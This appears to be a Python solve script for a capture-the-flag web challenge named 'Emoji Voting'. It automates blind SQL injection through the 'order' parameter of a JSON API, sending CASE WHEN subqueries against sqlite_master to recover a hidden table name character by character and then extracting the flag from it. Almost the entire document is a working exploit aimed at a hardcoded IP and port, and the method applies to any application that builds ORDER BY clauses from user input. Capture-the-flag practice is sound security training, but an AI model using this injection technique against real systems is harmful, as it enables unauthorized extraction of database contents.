# @elbee_ez

####################################################################################
# Emoji Voting | Difficulty: 2-star | Web ##########################################
####################################################################################
# A place to vote your favourite and least favourite puny human emojis! ############
# This challenge will raise 43 euros for a good cause. #############################
# This article helped me a lot: https://portswigger.net/support/sql-injection-in-the-query-structure
####################################################################################

# VULN SQL injetion into an 'ORDER BY' section of a query. This allowed for a sort of bruteforce /w verification attack.


import requests

# CHANGEME
rhost="138.68.151.248"
rport="30506"

headers = {'Content-Type': 'application/json'}

#FIND TABLE NAME
hextable = ["1","2","3","4","5","6","7","8","9","0","a","b","c","d","e","f"]

#FIND FLAG
asciitable = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0","!","?","$","_","}"]

# Database values
flag_table="flag_"
flag="CHTB{"


print("\n")
print("THIS WILL TAKE A HELL OF A COUPLE OF MINUTES. PLEASE WAIT. 💀")
print("\n")

for i in range(0,10):
	start=i+6
	for x in range(len(hextable)):
		query = "(CASE WHEN (SELECT unicode(substr(name, "+str(start)+", 1)) FROM sqlite_master WHERE name LIKE 'flag_%')="+str(ord(hextable[x]))+" THEN id ELSE count END);"
		r = requests.post("http://"+rhost+":"+rport+"/api/list", headers=headers, json={"order":query})
		response = r.json()
		check = response[0]["id"]
		if check == 1:
			flag_table=flag_table+hextable[x]
			print(flag_table)
print("\n")
print("+="*50)
print("INJECTION SUCCESSFUL! FLAG TABLE RETRIEVED!")
print(flag_table)
print("=+"*50)
print("\n")
print("Retrieving flag column..")
print("\n")
start=0

for i in range(0,100):
	start=i+6
	for x in range(len(asciitable)):
		query = "(CASE WHEN (SELECT unicode(substr(flag, "+str(start)+", 1)) FROM "+flag_table+")="+str(ord(asciitable[x]))+" THEN id ELSE count END);"
		r = requests.post("http://"+rhost+":"+rport+"/api/list", headers=headers, json={"order":query})
		response = r.json()
		check = response[0]["id"]
		if check == 1:
			flag=flag+asciitable[x]
			placeholders=30-len(flag)
			print(flag+"?"*placeholders)
	if "}" in flag:
		break
print("+="*50)
print(flag)
print("=+"*50)
